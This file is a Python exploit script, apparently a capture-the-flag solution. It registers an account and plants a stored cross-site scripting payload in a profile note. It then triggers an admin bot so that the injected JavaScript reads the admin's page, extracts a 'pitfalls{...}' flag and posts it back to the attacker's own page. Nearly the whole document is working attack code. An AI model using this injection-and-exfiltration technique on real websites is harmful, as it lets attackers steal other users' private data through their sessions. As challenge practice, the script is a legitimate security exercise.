import requests
import re
import time
import sys
ipsocket = "172.24.4.2:8080"
ipsocket = sys.argv[1]
BASE = f"http://{ipsocket}"
USERNAME = "mario"
PASSWORD = "bros"

s = requests.Session()

def ensure_account():
    s.post(f"{BASE}/register", data={"username": USERNAME, "password": PASSWORD})
    r = s.post(f"{BASE}/login", data={"username": USERNAME, "password": PASSWORD})
    assert r.status_code == 200, "Login failed"

def plant_payload():
    expr = (
        "(fetch('/space?user=admin')"
        ".then(r=>r.text())"
        ".then(t=>{"
        "  var m=t.match(/pitfalls\\{[^}]+\\}/);"
        "  var flag=m?m[0]:'not_found';"
        "  var fd=new FormData();"
        "  fd.append('content', flag);"
        "  fd.append('h-captcha-response','xxxxx');"
        f"  fetch('/space/update?user={USERNAME}', {{method:'POST', body: fd}});"
        "}), 0.5)"
    )

    note_html = f"""
<div>
  <canvas id="meditationCanvas"></canvas>
  <input id="visualExpr" type="text" value="{expr}">
</div>
<script src="/static/meditation.js"></script>
<script src="https://js.hcaptcha.com/1/api.js?onload=startMeditation&render=explicit" async defer></script>
""".strip()

    r = s.post(f"{BASE}/space/update", data={
        "content": note_html,
        "h-captcha-response": "x"
    })
    assert r.status_code == 200, "Storing payload failed"

def trigger_bot_and_collect():
    r = s.post(f"{BASE}/space/request_guidance")
    assert r.status_code == 200, "Bot trigger failed"
    time.sleep(25)
    page = s.get(f"{BASE}/space").text
    m = re.search(r"pitfalls\{[^}]+\}", page)
    if m:
        print("Flag:", m.group(0))
    else:
        print("Flag not found; dump head:", page[:500])

if __name__ == "__main__":
    ensure_account()
    plant_payload()
    trigger_bot_and_collect()
